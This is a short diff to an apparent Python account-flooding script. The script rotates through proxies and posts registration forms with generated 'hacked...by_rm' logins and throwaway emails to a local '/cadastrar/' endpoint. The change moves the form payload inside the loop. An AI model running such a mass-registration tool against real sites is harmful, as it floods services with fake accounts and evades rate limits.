@@ -29,12 +29,6 @@ for proxy in open(filename,'r').readlines():
 	   'https': proxy
 	}
 	url = "http://127.0.0.1/cadastrar/"
-	post = {
-		'input_login': login,
-		'input_pass': senha, 
-		'input_passconf': senha, 
-		'input_email':  email
-	}
 
 	try:
 		proxy_test=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
@@ -49,6 +43,13 @@ for proxy in open(filename,'r').readlines():
 			login = str(rand1)+'-hacked'+str(criada)+'by_rm'+codigo+str(i)+str(ii)
 			email = 'rm-'+codigo+str(i)+str(ii)+'@'+codigo2+str(rand1)+'vuln.xxx'
 			senha = 'senha123'
+			
+			post = {
+				'input_login': login,
+				'input_pass': senha, 
+				'input_passconf': senha, 
+				'input_email':  email
+			}
 
 			try:
 				r = requests.post(url, data=post,proxies=proxies,timeout=20,headers=headers) 
